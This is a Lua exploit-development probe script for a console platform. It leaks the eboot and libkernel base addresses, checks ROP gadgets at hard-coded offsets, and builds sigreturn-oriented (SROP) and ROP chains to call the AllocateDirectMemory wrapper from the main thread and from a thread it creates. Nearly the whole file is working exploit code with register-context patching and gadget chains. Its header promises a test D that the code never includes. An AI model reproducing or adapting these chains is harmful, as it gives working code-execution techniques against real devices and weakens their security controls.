-- CRASH_CLASS: MODERATE
-- PROBE 528e: Diagnose wrapper calling from SROP
--
-- 528d confirmed: child SROP + raw syscall = OK, child SROP + wrapper = CRASH.
-- Question: is this a child-specific issue (TLS) or SROP-specific?
--
--   [A] Main-thread SROP → AllocateDirectMemory wrapper (has real TLS)
--   [B] Main-thread fcall → AllocateDirectMemory wrapper (baseline, known good)
--   [C] Child SROP → wrapper with REAL TLS (copy main thread's FS base)
--   [D] Child ROP (no SROP) → wrapper via call gadget

print("=== PROBE 528e: SROP WRAPPER DIAGNOSTICS ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b, n) for o = 0, n - 4, 4 do wd(b + o, 0) end end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- Ignore SIGSYS + SIGPIPE + SIGBUS + SIGSEGV
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa_buf, uint64(0)) end)
end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
local function eaddr(off) return eboot + uint64(off) end

-- Get libkernel base
local ib2 = memory.alloc(0x200)
wd(N(ib2), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib2) end)
local lk_lo = rd(N(ib2) + 0x108) or 0
local lk_hi = rd(N(ib2) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end

if lk_lo == 0 and lk_hi == 0 then
    for h = 0, 0x100 do
        local ib3 = memory.alloc(0x200)
        wd(N(ib3), 0x160)
        local ok3, r3 = pcall(function() return mk(593)(uint64(h), ib3) end)
        if ok3 and N(r3) == 0 then
            local name = ""
            for i = 0, 31 do
                local b = rd(N(ib3) + 8 + i)
                if b then
                    local c = b % 256
                    if c == 0 then break end
                    if c >= 32 and c < 127 then name = name .. string.char(c) end
                end
            end
            if name:find("libkernel") then
                lk_lo = rd(N(ib3) + 0x108) or 0
                lk_hi = rd(N(ib3) + 0x10C) or 0
                if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
                if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
                break
            end
        end
    end
end

if lk_lo == 0 and lk_hi == 0 then print("FAIL: libkernel"); return end
local lk_text = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local alloc_fn = lk_text + uint64(0x17EF0)
print("libkernel=" .. fmt(lk_text))
print("AllocateDirectMemory=" .. fmt(alloc_fn))

-- Gadgets
local G = {
    pop_rax  = 0x992,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    pop_rdx  = 0x3B02D7,
    pop_rcx  = 0xE64,
    mov_m    = 0x92C67,
    bare_ret = 0x42,
}
local function vg(off, expect, nb)
    local d = rd(N(eboot) + off)
    if d == nil then return false end
    if d < 0 then d = d + 0x100000000 end
    local mask = 0
    for i = 0, nb - 1 do mask = mask + 0xFF * (2 ^ (i * 8)) end
    return (d % (mask + 1)) == expect
end
if not vg(G.pop_rax, 0xC358, 2) then print("GADGET FAIL"); return end
if not vg(G.pop_rdi, 0xC35F, 2) then
    G.pop_rdi = 0x75DFE
    if not vg(G.pop_rdi, 0xC35F, 2) then print("GADGET FAIL"); return end
end
if not vg(G.mov_m, 0xC3078948, 4) then print("GADGET FAIL"); return end
print("gadgets OK")

-- Main-thread SROP setup (from 141b pattern)
local MC = 0x40
local sc_gc = mk(421)
local sc_sr = mk(417)
local mctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(mctx)) end)
local rip_val = rq(N(mctx) + MC + 0xA0)
if not rip_val then print("getcontext FAIL"); return end
local rh, rl = get_hi_lo(rip_val)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. fmt(sc_addr))

-- Read main thread's FS base (we'll give it to the child in section C)
-- sysarch(AMD64_GET_FSBASE=128, &out)
local fsbase_out = memory.alloc(8)
wq(N(fsbase_out), uint64(0))
local function srop_raw(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(mctx)) end)
    wq(N(mctx) + MC + 0xA0, sc_addr)
    wq(N(mctx) + MC + 0x38, uint64(num))
    if a1 then wq(N(mctx) + MC + 0x08, a1) end
    if a2 then wq(N(mctx) + MC + 0x10, a2) end
    if a3 then wq(N(mctx) + MC + 0x18, a3) end
    if a4 then wq(N(mctx) + MC + 0x20, a4) end
    if a5 then wq(N(mctx) + MC + 0x28, a5) end
    if a6 then wq(N(mctx) + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(mctx)) end)
    if ok then return rv end
    return nil
end

srop_raw(165, uint64(128), uint64(N(fsbase_out)))
local fsbase = rq(N(fsbase_out))
print("main FS base=" .. fmt(fsbase))

-- ============================================================
-- [A] Main-thread SROP → AllocateDirectMemory wrapper
-- ============================================================
-- If this works, SROP itself isn't the problem — the issue is child TLS.
-- If this crashes, sigreturn's register state doesn't satisfy the wrapper.
print("")
print("[A] Main-thread SROP → AllocateDirectMemory wrapper")

local phys_a = memory.alloc(8)
wq(N(phys_a), uint64(0))

-- For a C function call via SROP:
--   mc_rip = function address
--   mc_rsp = fake stack with return address at [RSP+0]
--   args in rdi, rsi, rdx, rcx, r8, r9 (C ABI)
-- After the function returns, execution continues at [RSP+0].
-- We need [RSP+0] to be a gadget that does sigreturn back to our
-- saved context (so we return to Lua). But that's complex.
--
-- SIMPLER: since the main-thread SROP from 141b works by overwriting
-- the getcontext snapshot and calling sigreturn, the CPU state including
-- RSP/RBP are from getcontext. When the function returns, its "ret"
-- pops the original return address from getcontext's RIP (which was the
-- instruction after the getcontext syscall in the Lua C library).
--
-- Actually that won't work either. Let's think more carefully.
-- When we do getcontext, it saves: RIP = next instruction, RSP = current stack.
-- When we call sigreturn with patched mc_rip=alloc_fn, the function
-- executes with RSP = original (Lua's C stack). When alloc_fn does "ret",
-- it pops whatever is at that RSP, which is whatever was on Lua's stack
-- when getcontext was called. That return address leads back into the
-- Lua C runtime. But the C runtime expects to be at the sigreturn call,
-- not returning from alloc_fn.
--
-- THIS IS THE PROBLEM. Even on the main thread, after alloc_fn returns,
-- execution continues at a random point in Lua's C stack. The only
-- reason 141b's getpid worked is that getpid has NO stack frame — it's
-- just "syscall;ret" which pops right back to our expected RSP.
--
-- For a real function call, we need a proper fake stack.
-- And the sigreturn overwrites RSP. So we need to:
--   1. Set mc_rsp to a fake stack with:
--      [RSP+0] = address that will do sigreturn back to original context
--   2. This means we need TWO contexts or a way to chain sigreturn.
--
-- INSTEAD: use getcontext twice. Save a "restore" context first,
-- then overwrite the "call" context.

-- Save restore context
local restore_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(restore_ctx)) end)

-- Capture the return address from getcontext — this is where
-- execution resumes if we sigreturn to this context.
-- We'll use a trampoline: after alloc_fn returns, go to sigreturn(restore_ctx).

-- Actually, let's use a simpler approach. We have a writable stack.
-- Put a mini ROP chain on a fake stack:
--   [RSP+0] = return address after alloc_fn → pop_rdi; ret
--   [RSP+8] = &phys_a (for later inspection)
-- After alloc_fn returns (rax = result), the ret pops our pop_rdi gadget.
-- Then we do: pop_rdi → &restore_ctx → pop_rax → 417 → syscall;ret
-- (sigreturn back to Lua).

local fake_stack = memory.alloc(0x200)
z(fake_stack, 0x200)
-- Align: fn_rsp ≡ 8 (mod 16) for post-call
local fn_rsp_a = N(fake_stack) + 8

-- Build epilogue: store rax, then sigreturn back to restore_ctx
local ep = fn_rsp_a
local function esq(v) wq(ep, v); ep = ep + 8 end

-- After alloc_fn returns, rax = return value. Store it:
esq(eaddr(G.pop_rdi))
esq(uint64(N(phys_a)))         -- using phys_a as temp for rv
-- Wait, we want to store the return VALUE (rax) not just call pop_rdi.
-- After alloc_fn returns, rax = rv, and [RSP] = pop_rdi gadget.
-- pop_rdi pops &phys_a into rdi. Then we need mov [rdi],rax.
-- But rax was just overwritten by pop_rdi... NO — pop_rdi only sets rdi.
-- rax stays as the alloc_fn return value. Good!
-- Actually wait: pop rdi = 5F C3. It does: rdi ← [rsp]; rsp += 8; ret.
-- rax is untouched. So rax = alloc_fn result. Then mov [rdi],rax stores it.
esq(eaddr(G.mov_m))            -- [phys_a] = rax (alloc_fn return value)

-- Now sigreturn back to restore context
esq(eaddr(G.pop_rax))
esq(uint64(417))               -- rax = sigreturn
esq(eaddr(G.pop_rdi))
esq(uint64(N(restore_ctx)))    -- rdi = &restore_ctx
esq(stub)                      -- syscall;ret → sigreturn

-- Now prepare the call context
local call_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(call_ctx)) end)

-- Patch for AllocateDirectMemory call:
wq(N(call_ctx) + MC + 0xA0, alloc_fn)       -- rip = AllocateDirectMemory
wq(N(call_ctx) + MC + 0xB8, uint64(fn_rsp_a))  -- rsp = fake stack
wq(N(call_ctx) + MC + 0x08, uint64(0))          -- rdi = searchStart
wq(N(call_ctx) + MC + 0x10, uint64("0x150000000"))  -- rsi = searchEnd
wq(N(call_ctx) + MC + 0x18, uint64(0x4000))     -- rdx = len
wq(N(call_ctx) + MC + 0x50, uint64(0x4000))     -- rcx = align (C ABI)
wq(N(call_ctx) + MC + 0x28, uint64(0))          -- r8 = memType
wq(N(call_ctx) + MC + 0x30, uint64(N(phys_a)))  -- r9 = &phys_out

-- RBP should be something safe (fake_stack area so push rbp; mov rbp,rsp works)
wq(N(call_ctx) + MC + 0x48, uint64(N(fake_stack) + 0x100))  -- rbp

-- Fire: sigreturn → alloc_fn → ret → epilogue → sigreturn → Lua
local a_rv_ok, a_rv = pcall(function() return sc_sr(uint64(call_ctx)) end)
print("  sigreturn returned: ok=" .. tostring(a_rv_ok) .. " rv=" .. (a_rv and fmt(a_rv) or "nil"))

if alive() then
    local rv_stored = rq(N(phys_a))
    print("  stored rv=" .. fmt(rv_stored))
    if rv_stored and N(rv_stored) == 0 then
        print("  *** MAIN-THREAD SROP → WRAPPER WORKS! ***")
        print("  → Child crash is TLS-related")
    elseif rv_stored then
        print("  wrapper returned non-zero (expected: needs valid TLS?)")
    end
else
    print("  *** PROCESS DIED — SROP → wrapper crashes even on main thread ***")
    return
end

-- ============================================================
-- [B] Baseline: fcall → AllocateDirectMemory (known working)
-- ============================================================
print("")
print("[B] fcall → AllocateDirectMemory (baseline)")

local phys_b = memory.alloc(8)
wq(N(phys_b), uint64(0))
local ok_b, rv_b = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(N(phys_b)))
end)
print("  ok=" .. tostring(ok_b) .. " rv=" .. (rv_b and tostring(N(rv_b)) or "nil"))
local phys_b_val = rq(N(phys_b))
print("  phys=" .. fmt(phys_b_val))
if ok_b and N(rv_b) == 0 then
    print("  baseline OK")
end

if not alive() then print("DIED after B"); return end

-- ============================================================
-- [C] Child SROP → wrapper with MAIN thread's real FS base
-- ============================================================
print("")
print("[C] Child SROP → wrapper with main FS base")

if not fsbase or N(fsbase) == 0 then
    print("  no FS base, skip C")
else
    print("  using FS base=" .. fmt(fsbase))

    local sc455 = mk(455)
    local sc_mmap = mk(477)
    local shared_c = memory.alloc(0x100)
    z(shared_c, 0x100)

    local phys_c = memory.alloc(8)
    wq(N(phys_c), uint64(0))

    -- Build a fsbase_ptr that points to the REAL FS base value
    local fsbase_ptr_c = memory.alloc(8)
    wq(N(fsbase_ptr_c), fsbase)

    local uctx_c = memory.alloc(0x500)
    z(N(uctx_c), 0x500)

    local cstack = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    if not cstack or N(cstack) == 0 then
        print("  mmap FAIL"); return
    end

    local chain_off = 0x100000
    local chain_base = N(cstack) + chain_off + 8
    local pos = chain_base
    local function emit(v) wq(pos, v); pos = pos + 8 end

    -- sysarch(SET_FSBASE=129, &real_fsbase) — use REAL TLS
    emit(eaddr(G.pop_rax)); emit(uint64(165))
    emit(eaddr(G.pop_rdi)); emit(uint64(129))
    emit(eaddr(G.pop_rsi)); emit(uint64(N(fsbase_ptr_c)))
    emit(stub)

    -- getcontext
    emit(eaddr(G.pop_rax)); emit(uint64(421))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c)))
    emit(stub)

    -- Post-gc marker
    emit(eaddr(G.pop_rax)); emit(uint64(0x4444))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(shared_c) + 0x20))
    emit(eaddr(G.mov_m))

    -- Epilogue for after wrapper returns
    local epi = N(cstack) + 0x2000
    local ep2 = epi
    local function ewq2(v) wq(ep2, v); ep2 = ep2 + 8 end
    ewq2(eaddr(G.pop_rdi))
    ewq2(uint64(N(shared_c)))
    ewq2(eaddr(G.mov_m))       -- shared[0] = rax (rv)
    ewq2(eaddr(G.pop_rax)); ewq2(uint64(0xDEAD))
    ewq2(eaddr(G.pop_rdi)); ewq2(uint64(N(shared_c) + 0x10))
    ewq2(eaddr(G.mov_m))
    ewq2(eaddr(G.pop_rax)); ewq2(uint64(431))
    ewq2(eaddr(G.pop_rdi)); ewq2(uint64(0))
    ewq2(stub)

    -- Fake stack for wrapper
    local fn_rsp_c = N(cstack) + 0x3008
    wq(fn_rsp_c, uint64(epi))

    -- Patch ucontext
    emit(eaddr(G.pop_rax)); emit(alloc_fn)
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c) + MC + 0xA0))
    emit(eaddr(G.mov_m))

    emit(eaddr(G.pop_rax)); emit(uint64(fn_rsp_c))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c) + MC + 0xB8))
    emit(eaddr(G.mov_m))

    -- rbp = safe
    emit(eaddr(G.pop_rax)); emit(uint64(N(cstack) + 0x4000))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c) + MC + 0x48))
    emit(eaddr(G.mov_m))

    -- rdi = searchStart (0)
    emit(eaddr(G.pop_rax)); emit(uint64(0))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c) + MC + 0x08))
    emit(eaddr(G.mov_m))

    -- rsi = searchEnd
    emit(eaddr(G.pop_rax)); emit(uint64("0x150000000"))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c) + MC + 0x10))
    emit(eaddr(G.mov_m))

    -- rdx = len
    emit(eaddr(G.pop_rax)); emit(uint64(0x4000))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c) + MC + 0x18))
    emit(eaddr(G.mov_m))

    -- rcx = align (C ABI arg4)
    emit(eaddr(G.pop_rax)); emit(uint64(0x4000))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c) + MC + 0x50))
    emit(eaddr(G.mov_m))

    -- r8 = memType (0)
    emit(eaddr(G.pop_rax)); emit(uint64(0))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c) + MC + 0x28))
    emit(eaddr(G.mov_m))

    -- r9 = &phys_out
    emit(eaddr(G.pop_rax)); emit(uint64(N(phys_c)))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c) + MC + 0x30))
    emit(eaddr(G.mov_m))

    -- sigreturn
    emit(eaddr(G.pop_rax)); emit(uint64(417))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(uctx_c)))
    emit(stub)

    local chain_len = pos - chain_base
    print("  chain=" .. chain_len .. " bytes")

    local child_stack_sz = chain_off + 0x10
    local param = memory.alloc(0x40)
    z(param, 0x40)
    wq(N(param) + 0x00, eaddr(G.bare_ret))
    wq(N(param) + 0x08, uint64(0))
    wq(N(param) + 0x10, cstack)
    wq(N(param) + 0x18, uint64(child_stack_sz))
    local tid_p = memory.alloc(8)
    wq(N(tid_p), uint64(0))
    wq(N(param) + 0x30, uint64(N(tid_p)))

    local ok_t, ret_t = pcall(function()
        return sc455(uint64(N(param)), uint64(0x38))
    end)

    if not ok_t or (ret_t and N(ret_t) ~= 0) then
        print("  thr_new FAIL")
    else
        local done = false
        for _ = 1, 500000 do
            local flag = rq(N(shared_c) + 0x10)
            if flag and N(flag) == 0xDEAD then done = true; break end
            local x = 0; for k = 1, 50 do x = x + k end
        end

        if not alive() then
            print("  PROCESS DIED (even with real TLS!)")
            local diag = rq(N(shared_c) + 0x20)
            print("  gc_marker=" .. fmt(diag))
            return
        end

        local rv_c = rq(N(shared_c))
        local phys_c_val = rq(N(phys_c))
        local diag = rq(N(shared_c) + 0x20)
        print("  done=" .. tostring(done))
        print("  gc_marker=" .. fmt(diag))
        print("  rv=" .. fmt(rv_c))
        print("  phys=" .. fmt(phys_c_val))
        if done and rv_c and N(rv_c) == 0 then
            print("  *** CHILD + REAL TLS → WRAPPER WORKS! ***")
        end
    end
end

if not alive() then print("DIED after C"); return end

-- ============================================================
-- Summary
-- ============================================================
print("")
print("[SUMMARY]")
print("  alive=" .. tostring(alive()))
print("=== 528e COMPLETE ===")
